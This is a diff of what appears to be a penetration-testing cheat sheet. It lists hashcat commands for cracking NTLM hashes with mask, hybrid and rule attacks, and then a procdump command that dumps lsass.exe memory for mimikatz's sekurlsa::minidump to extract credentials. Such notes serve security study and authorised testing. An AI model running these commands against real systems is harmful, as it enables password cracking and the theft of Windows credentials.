@@ -53,12 +53,14 @@ hashcat -a 3 #mask attack; use syntax
 ?s - special
 ?a - all above
 hashcat -m 1000 -a 0 hashes.txt ?u?l?l?l?l?l?d?d #8 char pw, starts with upper, 5 lowercase in middle, 2 digits
-
 hashcat -m 1000 -a 6 hashes.txt words.txt ?s?d  #take wordlist file and add mask to end ?s?d = specialchar, digit
-
 hashcat -m 1000 -a 7 hashes.txt ?s?d? words.txt  #take wordlist and prepend mask
 
---# MKATX #--
+hashcat can also use rules to apply permutations;
+hashcat -m 1000 -a 0 hash.txt words.txt -r best64.rule  #64 permutations of words in wordlsit
+
+
+--------# MKATX #--------
 .\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 mk.exe
 sekurlsa::minidump lsass.dmp
